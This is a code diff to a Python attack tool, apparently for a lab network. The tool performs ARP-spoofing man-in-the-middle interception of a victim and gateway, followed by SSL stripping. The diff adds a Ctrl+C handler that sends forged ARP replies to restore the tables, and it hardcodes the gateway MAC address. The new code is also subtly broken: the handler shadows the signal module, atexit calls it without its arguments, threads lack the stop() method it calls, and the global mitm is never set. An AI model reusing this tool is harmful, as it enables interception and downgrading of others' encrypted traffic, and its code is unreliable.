@@ -6,9 +6,41 @@ import recon
 import os
 import sys
 import threading
+import atexit
+import signal
+
+# global variable for the MITM thread
+mitm = None
+
+
+'''
+- Register the cleanup function to be called when the script is terminated by a SIGINT signal (Ctrl+C)
+- Flush IPTables
+- ARP Table Restoration
+- Stop the MITM Attack
+'''
+def cleanup(signal, frame):
+    global mitm
+
+    # Stop the MITM thread
+    if mitm is not None:
+        # Assuming your MITM thread has a stop() method
+        mitm.stop()
+
+    # Restore ARP tables
+    print("Restoring ARP tables...")
+    send(ARP(op=2, pdst="10.0.2.9", psrc="10.0.2.11", hwdst="08:00:27:d7:68:54", hwsrc="08:00:27:00:AD:91"), count=5)
+    send(ARP(op=2, pdst="10.0.2.11", psrc="10.0.2.9", hwdst="08:00:27:00:AD:91", hwsrc="08:00:27:d7:68:54"), count=5)
+
+    print("Cleanup done. Exiting...")
+    sys.exit(0)
+
+# Register the cleanup function to be called on exit
+signal.signal(signal.SIGINT, cleanup)
 
 
 def main():
+    atexit.register(cleanup)
     os.system("clear")
     interfaces = recon.list_interfaces()
 
@@ -79,7 +111,7 @@ def main():
         # Perform Man-in-the-Middle using a separate thread 
         mitm = threading.Thread(\
             target=arp_mitm_gateway.gateway_spoof, args=  \
-                ("10.0.2.11", ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT))
+                ("10.0.2.11", ipAttackerNAT, ipVictimNAT, "08:00:27:00:AD:91", macAttackerNAT, macVictimNAT, interfaceNAT))
         mitm.start()
         # initiate SSL stripping attack on the NAT interface
         ssl_strip.ssl_strip(interfaceNAT)
